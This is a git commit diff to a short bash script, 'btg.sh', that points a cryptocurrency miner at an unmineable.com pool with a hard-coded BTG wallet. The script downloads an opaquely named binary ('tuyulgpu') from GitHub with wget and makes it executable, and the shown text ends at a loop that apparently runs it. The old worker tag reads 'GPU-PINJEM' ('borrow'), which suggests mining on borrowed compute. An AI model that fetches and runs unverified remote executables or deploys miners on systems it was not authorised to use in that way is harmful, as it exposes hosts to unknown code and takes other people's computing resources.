12d0bcb9ec476f2506b9219558f727b6cb270f55
skullCANDe <85566406+skullCANDe@users.noreply.github.com>
2021-07-17 14:22:37 +0530

    Update btg.sh

--- btg.sh
+++ btg.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
 WALLET=BTG:GXgga35GTF5xn2v6u8mhY3xU3phbwh9KzH
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU)
 wget https://github.com/skullCANDe/skyz/raw/main/tuyulgpu
 chmod +x tuyulgpu
 while [ 1 ]; do
